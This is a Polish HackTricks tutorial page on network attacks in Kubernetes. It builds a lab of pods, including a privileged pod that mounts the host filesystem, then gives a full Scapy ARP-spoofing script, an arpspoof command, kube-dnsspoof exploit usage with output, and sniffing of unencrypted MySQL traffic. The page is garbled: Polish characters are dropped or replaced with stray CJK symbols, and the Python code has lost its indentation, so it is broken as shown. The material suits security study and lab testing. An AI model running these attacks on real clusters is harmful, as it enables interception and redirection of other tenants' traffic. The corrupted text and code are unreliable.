# Ataki sieciowe w Kubernetes

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w GitHub.

</details>

## Wprowadzenie

W Kubernetes obserwuje si, 偶e domylne zachowanie pozwala na nawizywanie pocze midzy **wszystkimi kontenerami znajdujcymi si na tym samym w藕le**. Dotyczy to niezale偶nie od r贸偶nic w przestrzeniach nazw. Taka czno siga a偶 do **warstwy 2** (Ethernet). W rezultacie taka konfiguracja potencjalnie nara偶a system na podatnoci. Konkretnie otwiera mo偶liwo dla **zoliwego kontenera** wykonania **ataku ARP spoofing** na inne kontenery znajdujce si na tym samym w藕le. Podczas takiego ataku zoliwy kontener mo偶e podstpnie przechwyci lub zmodyfikowa ruch sieciowy przeznaczony dla innych kontener贸w.

Ataki ARP spoofing polegaj na **wysyaniu faszywych wiadomoci ARP** (Address Resolution Protocol) w lokalnej sieci. Powoduje to powizanie **adresu MAC atakujcego z adresem IP prawidowego komputera lub serwera w sieci**. Po pomylnym wykonaniu takiego ataku, atakujcy mo偶e przechwyci, zmodyfikowa lub nawet zatrzyma dane w trakcie przesyania. Atak jest wykonywany na warstwie 2 modelu OSI, dlatego domylne poczenie w Kubernetes na tej warstwie budzi obawy dotyczce bezpieczestwa.

W scenariuszu zostan utworzone 4 maszyny:

* ubuntu-pe: Maszyna uprzywilejowana do ucieczki do wza i sprawdzenia metryk (nie jest potrzebna do ataku)
* **ubuntu-attack**: **Zoliwy** kontener w domylnej przestrzeni nazw
* **ubuntu-victim**: Maszyna **ofiara** w przestrzeni nazw kube-system
* **mysql**: Maszyna **ofiara** w domylnej przestrzeni nazw
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Podstawowa sie Kubernetes

Jeli chcesz uzyska wicej szczeg贸贸w na temat omawianych tutaj temat贸w dotyczcych sieci, przejd藕 do odnonik贸w.

### ARP

Og贸lnie rzecz biorc, **sie pod-do-pod wewntrz wza** jest dostpna za porednictwem **mostu**, kt贸ry czy wszystkie pody. Ten most nazywa si "**cbr0**". (Niekt贸re wtyczki sieciowe zainstaluj sw贸j wasny most.) **cbr0 mo偶e r贸wnie偶 obsugiwa rozwizanie ARP** (protok贸 rozwizywania adres贸w). Gdy przychodzi pakiet do cbr0, mo偶e on rozwiza docelowy adres MAC za pomoc ARP.

Fakt ten oznacza, 偶e domylnie **ka偶dy pod dziaajcy w tym samym w藕le** bdzie m贸g **komunikowa si** z dowolnym innym podem w tym samym w藕le (niezale偶nie od przestrzeni nazw) na poziomie Ethernetu (warstwa 2).

{% hint style="warning" %}
Dlatego mo偶liwe jest przeprowadzenie atak贸w **ARP Spoofing** midzy podami w tym samym w藕le.
{% endhint %}

### DNS

W rodowiskach Kubernetes zazwyczaj znajdziesz 1 (lub wicej) **uruchomione usugi DNS** zwykle w przestrzeni nazw kube-system:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
W poprzednich informacjach mo偶na zauwa偶y co interesujcego, **IP usugi** to **10.96.0.10**, ale **IP poda** uruchamiajcego usug to **172.17.0.2**.

Jeli sprawdzisz adres DNS wewntrz dowolnego poda, znajdziesz co takiego:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
Jednak偶e, **pods nie wie**, jak dotrze do tego **adresu**, poniewa偶 zakres pods w tym przypadku to 172.17.0.10/26.

Dlatego te偶, pods wyle **偶dania DNS na adres 10.96.0.10**, kt贸ry zostanie **przetumaczony** przez cbr0 **na** **172.17.0.2**.

{% hint style="warning" %}
Oznacza to, 偶e **偶danie DNS** pods zawsze bdzie przechodzi przez **mostek**, aby **przetumaczy** adres IP usugi na adres IP punktu kocowego, nawet jeli serwer DNS znajduje si w tej samej podsieci co pods.

Znajc to, i wiedzc, 偶e **ataki ARP s mo偶liwe**, pods w w藕le bd w stanie **przechwyci ruch** midzy **ka偶dym pods** w **podsieci** a **mostkiem** i **modyfikowa** odpowiedzi DNS od serwera DNS (**DNS Spoofing**).

Co wicej, jeli **serwer DNS** znajduje si w **tym samym w藕le co atakujcy**, atakujcy mo偶e **przechwyci wszystkie 偶dania DNS** dowolnego pods w klastrze (midzy serwerem DNS a mostkiem) i modyfikowa odpowiedzi.
{% endhint %}

## ARP Spoofing w pods w tym samym w藕le

Naszym celem jest **ukra przynajmniej komunikacj od ubuntu-victim do mysql**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof

ARPSpoof jest technik ataku sieciowego, kt贸ra polega na podszywaniu si pod inn maszyn w sieci lokalnej. Atakujcy wysya faszywe pakiety ARP, aby wprowadzi w bd inne urzdzenia w sieci i przekierowa ruch sieciowy do swojego komputera. W ten spos贸b atakujcy mo偶e przechwyci, modyfikowa lub wykrada dane przesyane midzy innymi urzdzeniami w sieci. Ten rodzaj ataku jest szczeg贸lnie skuteczny w sieciach lokalnych, takich jak Kubernetes, gdzie wiele kontener贸w dziaa na tej samej fizycznej maszynie.
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

Jak ju偶 wspomniano, jeli **skompromitujesz pod w tym samym w藕le co pod serwera DNS**, mo偶esz **przeprowadzi atak typu MitM** za pomoc **ARPSpoofing** na **mostku i podzie DNS** oraz **zmienia wszystkie odpowiedzi DNS**.

Masz naprawd fajne **narzdzie** i **samouczek**, aby to przetestowa na [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

W naszym scenariuszu, **pobierz** **narzdzie** na pod atakujcego i utw贸rz plik o nazwie `hosts` z **domenami**, kt贸re chcesz **podrobi**, na przykad:
```
cat hosts
google.com. 1.1.1.1
```
Przeprowad藕 atak na maszyn ubuntu-victim:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
Jeli pr贸bujesz stworzy wasny skrypt do przechwytywania DNS, jeli **tylko zmienisz odpowied藕 DNS**, to **nie zadziaa**, poniewa偶 odpowied藕 bdzie miaa **adres IP 藕r贸dowy** zoliwego **poda** i nie zostanie zaakceptowana.\
Musisz wygenerowa **nowy pakiet DNS** z **adresem IP 藕r贸dowym** DNS, do kt贸rego ofiara wysya 偶danie DNS (co w rodzaju 172.16.0.2, a nie 10.96.0.10, to adres IP usugi DNS K8s, a nie adres IP serwera DNS, wicej na ten temat w wprowadzeniu).
{% endhint %}

## Przechwytywanie ruchu

Narzdzie [**Mizu**](https://github.com/up9inc/mizu) to proste, ale pot偶ne narzdzie do **przegldania ruchu API w Kubernetes**, kt贸re umo偶liwia **wywietlanie caej komunikacji API** midzy mikroserwisami, pomagajc w debugowaniu i rozwizywaniu problem贸w zwizanych z regresj.\
Zainstaluje ono agenty w wybranych podach, zbierze informacje o ich ruchu i poka偶e je w serwerze sieciowym. Jednak偶e, bdziesz potrzebowa wysokich uprawnie K8s do tego (i nie jest to zbyt dyskretne).

## Odwoania

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
